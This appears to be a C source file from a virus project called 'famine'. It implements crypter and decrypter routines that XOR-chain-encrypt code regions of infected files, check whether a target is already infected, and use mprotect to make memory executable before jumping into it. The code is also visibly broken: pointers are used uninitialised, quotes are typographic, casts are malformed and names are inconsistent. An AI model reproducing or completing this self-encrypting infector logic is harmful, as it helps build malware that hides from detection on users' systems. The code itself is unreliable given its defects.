//
// Created by Joris GOUNAND on 11/8/19.
//

#include "../inc/famine.h"

int decrypt(void *start,size_t size, int key)
{
	void *dst;
	typedef long (*JittedFunc)(int);

	if (start || size || key)
	{;}

	if (mprotect(start, size, PROT_WRITE | PROT_READ) == -1) {
		//perror("mprotect");
		return -1;
	}
	//memcpy(dst, code, sizeof(code));

	if (mprotect(start, size, PROT_READ | PROT_EXEC) == -1) {
		perror("mprotect");
		return -1;
	}
	JittedFunc func = dst;
	func(0);
		//printf("test Jitted %d\n",(int)func(0));
		return 0;
}

void decrypter(void)
{
	size_t	size;
	size_t	offset;
	char	*start;

	offset = *(int *)(&main + get_eip() - 4 + sizeof(offset));
	size = *(int *)(&main + get_eip() - 4);
	if(size && im_infected(&main + get_eip()))
	{
		start[offset] ^= *(int *)(&main + get_eip() - 4);
		offset++;
		while (offset < size)
		{
			start[offset] ^= start[offset - 1];
			offset++;
		}
	}
}

void crypter(t_file file)
{
	size_t	size;
	size_t	offset;
	char	*start;

	printf(“%p\n”,get_eip() - ((char )&yeah - (char )&crypter));
	offset = *(int *)(&main + get_eip() - 4 + sizeof(offset));
	size = *(int *)(&main + get_eip() - 4);
	if(size && is_infected(file->data))
	{
		start[offset + size] ^= *(int *)(&main + get_eip() - 4);
		size--;
		while (size)
		{
			start[offset + size] ^= start[offset + size - 1];
			size--;
		}
	}
}
